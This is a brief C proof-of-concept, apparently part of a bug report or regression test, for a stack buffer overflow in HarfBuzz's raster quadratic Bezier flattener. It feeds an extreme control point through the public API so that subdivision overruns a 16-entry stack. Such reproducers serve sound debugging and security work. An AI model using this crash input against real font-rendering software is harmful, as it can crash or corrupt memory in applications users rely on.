/* PoC for a stack-buffer-overflow in the raster quadratic/cubic Bezier
 * flatteners (src/hb-raster-draw.cc).
 *
 * The explicit-stack flattener keeps a fixed-size stack of 16 entries,
 * sized on the assumption that recursion depth never exceeds 16.  The
 * depth cap is HB_RASTER_MAX_FLATTEN_DEPTH, which is now 24, so a curve
 * that still fails the flatness test past the old depth of 16 pushes
 * past the 16-entry stack.
 *
 * Driven entirely through hb-raster's public API: create a rasterizer,
 * get its hb_draw_funcs_t, and feed it a single pathological quadratic
 * Bezier whose control point is far enough off-axis that the flatness
 * test doesn't converge until well past depth 16.
 */

#include <hb.h>
#include <hb-raster.h>

int
main (void)
{
  hb_raster_draw_t *draw = hb_raster_draw_create_or_fail ();
  hb_draw_funcs_t *funcs = hb_raster_draw_get_funcs (draw);

  hb_draw_state_t st = HB_DRAW_STATE_DEFAULT;

  hb_draw_move_to (funcs, draw, &st, 0.f, 0.f);
  /* Symmetric quadratic: p0=(0,0), control=(0,1e10), p2=(0,0).
   * Deviation from the chord shrinks 4x per subdivision level, so it
   * is still far above the 0.25px flatness threshold at depth 16, but
   * well below it by depth 24. */
  hb_draw_quadratic_to (funcs, draw, &st, 0.f, 1.0e10f, 0.f, 0.f);
  hb_draw_close_path (funcs, draw, &st);

  hb_raster_image_t *image = hb_raster_draw_render (draw);
  if (image)
    hb_raster_image_destroy (image);

  hb_raster_draw_destroy (draw);

  return 0;
}
